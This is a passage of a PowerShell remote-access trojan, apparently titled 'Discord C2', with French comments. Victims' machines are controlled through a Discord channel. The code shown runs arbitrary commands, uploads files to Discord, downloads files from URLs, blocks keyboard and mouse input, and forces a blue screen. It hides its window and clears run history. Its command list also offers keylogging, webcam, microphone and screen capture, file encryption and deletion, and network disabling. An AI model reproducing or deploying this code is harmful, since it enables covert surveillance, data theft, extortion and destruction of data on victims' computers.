        Write-DebugLog "Erreur lors de la lecture du son : $_"
        Send-Error -ErrorMessage "Échec de la lecture du son : $_" -Context "Play-Sound"
    }
}

# Simulation d'un BSOD
function Fake-BSOD {
    try {
        $bsodScript = @"
            Add-Type -TypeDefinition @'
                using System.Runtime.InteropServices;
                public class BSOD {
                    [DllImport("ntdll.dll")]
                    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);
                }
            '@
            $response = 0
            [BSOD]::NtRaiseHardError(0xC0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
"@
        Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command $bsodScript" -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Prank : BSOD simulé"
            "description" = "Un écran bleu de la mort a été simulé (aucun dommage réel)."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "BSOD simulé exécuté"
    } catch {
        Write-DebugLog "Erreur lors de la simulation BSOD : $_"
        Send-Error -ErrorMessage "Échec de la simulation BSOD : $_" -Context "Fake-BSOD"
    }
}

# Spam de sons
function Sound-Spam {
    try {
        for ($i = 0; $i -lt 5; $i++) {
            [System.Media.SystemSounds]::Beep.Play()
            Start-Sleep -Milliseconds 500
        }
        Send-Message -Embed @{
            "title" = "Prank : Spam de sons"
            "description" = "Des sons système ont été joués de manière répétée."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Spam de sons exécuté"
    } catch {
        Write-DebugLog "Erreur lors du spam de sons : $_"
        Send-Error -ErrorMessage "Échec du spam de sons : $_" -Context "Sound-Spam"
    }
}

# ------------------------- LOCK -------------------------

# Verrouillage de l'écran
function Lock-Screen {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("^{ESC}")
        Start-Sleep -Milliseconds 500
        [System.Windows.Forms.SendKeys]::SendWait("^{L}")
        Send-Message -Embed @{
            "title" = "Écran verrouillé"
            "description" = "L'écran de l'utilisateur a été verrouillé."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Écran verrouillé"
    } catch {
        Write-DebugLog "Erreur lors du verrouillage de l'écran : $_"
        Send-Error -ErrorMessage "Échec du verrouillage de l'écran : $_" -Context "Lock-Screen"
    }
}

# Désactivation des entrées
function Disable-Input {
    try {
        Add-Type -TypeDefinition @"
            using System.Runtime.InteropServices;
            public class Input {
                [DllImport("user32.dll")]
                public static extern bool BlockInput(bool fBlockIt);
            }
"@
        [Input]::BlockInput($true)
        Start-Sleep -Seconds 10
        [Input]::BlockInput($false)
        Send-Message -Embed @{
            "title" = "Entrées désactivées"
            "description" = "Le clavier et la souris ont été désactivés temporairement (10 secondes)."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Entrées désactivées temporairement"
    } catch {
        Write-DebugLog "Erreur lors de la désactivation des entrées : $_"
        Send-Error -ErrorMessage "Échec de la désactivation des entrées : $_" -Context "Disable-Input"
    }
}

# Déconnexion de la session
function Logoff {
    try {
        shutdown /l
        Send-Message -Embed @{
            "title" = "Session déconnectée"
            "description" = "La session utilisateur a été déconnectée."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Session déconnectée"
    } catch {
        Write-DebugLog "Erreur lors de la déconnexion de la session : $_"
        Send-Error -ErrorMessage "Échec de la déconnexion de la session : $_" -Context "Logoff"
    }
}

# ------------------------- AUTRES -------------------------

# Exécution d'une commande PowerShell
function Execute-Command {
    param([string]$Command)
    try {
        $output = Invoke-Expression $Command | Out-String
        Send-Message -Embed @{
            "title" = "Commande exécutée"
            "description" = "Résultat de la commande :\n```$output```"
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Commande"; "value" = "$Command"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Commande exécutée : $Command"
    } catch {
        Write-DebugLog "Erreur lors de l'exécution de la commande : $_"
        Send-Error -ErrorMessage "Échec de l'exécution de la commande : $_" -Context "Execute-Command"
    }
}

# Téléchargement d'un fichier vers Discord
function Upload-File {
    param([string]$Path)
    try {
        Send-File -FilePath $Path
    } catch {
        Write-DebugLog "Erreur lors du téléchargement du fichier : $_"
        Send-Error -ErrorMessage "Échec du téléchargement du fichier : $_" -Context "Upload-File"
    }
}

# Téléchargement d'un fichier depuis une URL
function Download-File {
    param([string]$Url, [string]$Path)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($Url, $Path)
        Send-Message -Embed @{
            "title" = "Fichier téléchargé"
            "description" = "Le fichier a été téléchargé depuis l'URL spécifiée."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "URL"; "value" = "$Url"; "inline" = $true }
                @{ "name" = "Chemin"; "value" = "$Path"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Fichier téléchargé depuis $Url vers $Path"
    } catch {
        Write-DebugLog "Erreur lors du téléchargement du fichier : $_"
        Send-Error -ErrorMessage "Échec du téléchargement du fichier : $_" -Context "Download-File"
    }
}

# Vérification de l'état des jobs
function Get-Status {
    try {
        $jobs = Get-Job | Where-Object { $_.State -eq "Running" }
        $cpu = [math]::Round((Get-WmiObject Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average, 2)
        $ram = [math]::Round((Get-WmiObject Win32_OperatingSystem).FreePhysicalMemory / 1MB, 2)
        $disk = [math]::Round((Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DeviceID -eq "C:" }).FreeSpace / 1GB, 2)
        $fields = $jobs | ForEach-Object {
            @{ "name" = "Job $($_.Name)"; "value" = "État: $($_.State)"; "inline" = $true }
        }
        Send-Message -Embed @{
            "title" = "État du système"
            "description" = "Informations sur les jobs et les ressources système."
            "color" = 0x00FFFF
            "fields" = @(
                @{ "name" = "CPU"; "value" = "$cpu %"; "inline" = $true }
                @{ "name" = "RAM libre"; "value" = "$ram MB"; "inline" = $true }
                @{ "name" = "Disque libre"; "value" = "$disk GB"; "inline" = $true }
            ) + $fields
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "État du système envoyé"
    } catch {
        Write-DebugLog "Erreur lors de la vérification de l'état : $_"
        Send-Error -ErrorMessage "Échec de la vérification de l'état : $_" -Context "Get-Status"
    }
}

# Vérification de la version
function Version-Check {
    try {
        $wc = New-Object System.Net.WebClient
        $remoteVersion = $wc.DownloadString($parent) | Select-String -Pattern 'version = "([\d.]+)"' | ForEach-Object { $_.Matches.Groups[1].Value }
        if ($remoteVersion -gt $version) {
            Send-Message -Embed @{
                "title" = "Mise à jour disponible"
                "description" = "Une nouvelle version ($remoteVersion) est disponible. Version actuelle : $version."
                "color" = 0x00FFFF
                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
            }
        } else {
            Send-Message -Embed @{
                "title" = "Version à jour"
                "description" = "Vous utilisez la dernière version ($version)."
                "color" = 0x00FF00
                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
            }
        }
        Write-DebugLog "Vérification de la version effectuée"
    } catch {
        Write-DebugLog "Erreur lors de la vérification de la version : $_"
        Send-Error -ErrorMessage "Échec de la vérification de la version : $_" -Context "Version-Check"
    }
}

# Liste des commandes
function Get-Help {
    try {
        $commands = @(
            @{ "name" = "!help"; "description" = "Affiche la liste des commandes"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!screenjob"; "description" = "Démarre la capture d'écran périodique"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!camjob"; "description" = "Démarre la capture webcam périodique"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!micjob"; "description" = "Démarre l'enregistrement audio périodique"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!keyjob"; "description" = "Démarre le keylogging"; "dangerous" = "Oui"; "visible" = "Non" }
            @{ "name" = "!system-info"; "description" = "Collecte les informations système"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!running-processes"; "description" = "Liste les processus en cours"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!network-info"; "description" = "Fournit des détails sur le réseau"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!nearbywifi"; "description" = "Liste les réseaux Wi-Fi à proximité"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!encrypt-files <chemin>"; "description" = "Chiffre les fichiers dans un dossier"; "dangerous" = "Oui"; "visible" = "Non" }
            @{ "name" = "!decrypt-files <chemin>"; "description" = "Déchiffre les fichiers dans un dossier"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!delete-files <chemin>"; "description" = "Supprime les fichiers dans un dossier"; "dangerous" = "Oui"; "visible" = "Non" }
            @{ "name" = "!disable-network"; "description" = "Désactive les adaptateurs réseau"; "dangerous" = "Oui"; "visible" = "Non" }
            @{ "name" = "!sendhydra"; "description" = "Simule une attaque par force brute"; "dangerous" = "Oui"; "visible" = "Non" }
            @{ "name" = "!random-mouse"; "description" = "Déplace la souris aléatoirement"; "dangerous" = "Non"; "visible" = "Oui" }
            @{ "name" = "!play-sound <url>"; "description" = "Joue un son depuis une URL"; "dangerous" = "Non"; "visible" = "Oui" }
            @{ "name" = "!fake-bsod"; "description" = "Simule un écran bleu (BSOD)"; "dangerous" = "Non"; "visible" = "Oui" }
            @{ "name" = "!soundspam"; "description" = "Joue des sons répétés"; "dangerous" = "Non"; "visible" = "Oui" }
            @{ "name" = "!lock-screen"; "description" = "Verrouille l'écran"; "dangerous" = "Oui"; "visible" = "Oui" }
            @{ "name" = "!disable-input"; "description" = "Désactive clavier/souris temporairement"; "dangerous" = "Oui"; "visible" = "Oui" }
            @{ "name" = "!logoff"; "description" = "Déconnecte la session"; "dangerous" = "Oui"; "visible" = "Oui" }
            @{ "name" = "!execute <commande>"; "description" = "Exécute une commande PowerShell"; "dangerous" = "Oui"; "visible" = "Dépendant" }
            @{ "name" = "!upload-file <chemin>"; "description" = "Télécharge un fichier vers Discord"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!download-file <url> <chemin>"; "description" = "Télécharge un fichier depuis une URL"; "dangerous" = "Oui"; "visible" = "Non" }
            @{ "name" = "!status"; "description" = "Affiche l'état des jobs et ressources"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!versioncheck"; "description" = "Vérifie les mises à jour"; "dangerous" = "Non"; "visible" = "Non" }
            @{ "name" = "!close"; "description" = "Arrête tout et supprime la catégorie"; "dangerous" = "Oui"; "visible" = "Non" }
        )
        $fields = $commands | ForEach-Object {
            @{ "name" = $_.name; "value" = "Description: $($_.description)\nDangereuse: $($_.dangerous)\nVisible: $($_.visible)"; "inline" = $false }
        }
        Send-Message -Embed @{
            "title" = "Liste des commandes"
            "description" = "Commandes disponibles pour le bot C2."
            "color" = 0x00FFFF
            "fields" = $fields
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Liste des commandes envoyée"
    } catch {
        Write-DebugLog "Erreur lors de l'envoi de la liste des commandes : $_"
        Send-Error -ErrorMessage "Échec de l'envoi de la liste des commandes : $_" -Context "Get-Help"
    }
}

# Arrêt du script et suppression de la catégorie
function Close-Script {
    try {
        Get-Job | Stop-Job -ErrorAction SilentlyContinue
        Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
        $headers = @{ 'Authorization' = "Bot $token" }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        $guildID = $guilds[0].id
        $channels = $wc.DownloadString("https://discord.com/api/v10/guilds/$guildID/channels") | ConvertFrom-Json
        $categoryChannels = $channels | Where-Object { $_.parent_id -eq $global:CategoryID -or $_.id -eq $global:CategoryID }
        foreach ($channel in $categoryChannels) {
            $wc.DownloadString("https://discord.com/api/v10/channels/$($channel.id)") | Out-Null
            $wc.UploadString("https://discord.com/api/v10/channels/$($channel.id)", "DELETE", "") | Out-Null
        }
        Remove-Item -Path "$env:Temp\*" -Include "ffmpeg.exe", "Screen.jpg", "Cam.jpg", "mic.wav", "c2_key.txt" -Force -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Script arrêté"
            "description" = "Tous les jobs ont été arrêtés et la catégorie Discord a été supprimée."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Script arrêté et catégorie supprimée"
        exit
    } catch {
        Write-DebugLog "Erreur lors de l'arrêt du script : $_"
        Send-Error -ErrorMessage "Échec de l'arrêt du script : $_" -Context "Close-Script"
    }
}

# ------------------------- INITIALISATION -------------------------

try {
    Hide-Window
    Clear-RunHistory
    if ($spawnChannels) {
        New-ChannelCategory
        New-Channel -name "data"
        if ($defaultstart) {
            Start-ScreenJob
            Start-CamJob
            Start-AudioJob
            Start-KeyJob
        }
    }
    if ($InfoOnConnect) {
        Get-SystemInfo
    }
} catch {
    Write-DebugLog "Erreur lors de l'initialisation : $_"
    Send-Error -ErrorMessage "Échec de l'initialisation : $_" -Context "Initialisation"
}

# ------------------------- BOUCLE PRINCIPALE -------------------------

try {
    $lastMessageID = $null
    while ($true) {
        $headers = @{ 'Authorization' = "Bot $token" }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $url = "https://discord.com/api/v10/channels/$global:SessionID/messages?limit=1"
        if ($lastMessageID) {
            $url += "&after=$lastMessageID"
        }
        $response = $wc.DownloadString($url)
        $messages = $response | ConvertFrom-Json
        if ($messages) {
            $lastMessageID = $messages[0].id
            $command = $messages[0].content
            switch -Regex ($command) {
                "^!help$" { Get-Help }
                "^!screenjob$" { Start-ScreenJob }
                "^!camjob$" { Start-CamJob }
                "^!micjob$" { Start-AudioJob }
                "^!keyjob$" { Start-KeyJob }
                "^!system-info$" { Get-SystemInfo }
                "^!running-processes$" { Get-RunningProcesses }
                "^!network-info$" { Get-NetworkInfo }
                "^!nearbywifi$" { Get-NearbyWifi }
                "^!encrypt-files\s+(.+)$" { Encrypt-Files -Path $matches[1] }
                "^!decrypt-files\s+(.+)$" { Decrypt-Files -Path $matches[1] }
                "^!delete-files\s+(.+)$" { Delete-Files -Path $matches[1] }
                "^!disable-network$" { Disable-Network }
                "^!sendhydra$" { Send-Hydra }
                "^!random-mouse$" { Random-Mouse }
                "^!play-sound\s+(.+)$" { Play-Sound -Url $matches[1] }
                "^!fake-bsod$" { Fake-BSOD }
                "^!soundspam$" { Sound-Spam }
                "^!lock-screen$" { Lock-Screen }
                "^!disable-input$" { Disable-Input }
                "^!logoff$" { Logoff }
                "^!execute\s+(.+)$" { Execute-Command -Command $matches[1] }
                "^!upload-file\s+(.+)$" { Upload-File -Path $matches[1] }
                "^!download-file\s+(.+)\s+(.+)$" { Download-File -Url $matches[1] -Path $matches[2] }
                "^!status$" { Get-Status }
                "^!versioncheck$" { Version-Check }
                "^!close$" { Close-Script }
                default {
                    Send-Message -Embed @{
                        "title" = "Commande inconnue"
                        "description" = "Utilisez !help pour voir la liste des commandes."
                        "color" = 0xFF0000
                        "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
                    }
                }
            }
        }
        Start-Sleep -Seconds 2
    }
} catch {
    Write-DebugLog "Erreur dans la boucle principale : $_"
    Send-Error -ErrorMessage "Erreur dans la boucle principale : $_" -Context "Main-Loop"
}
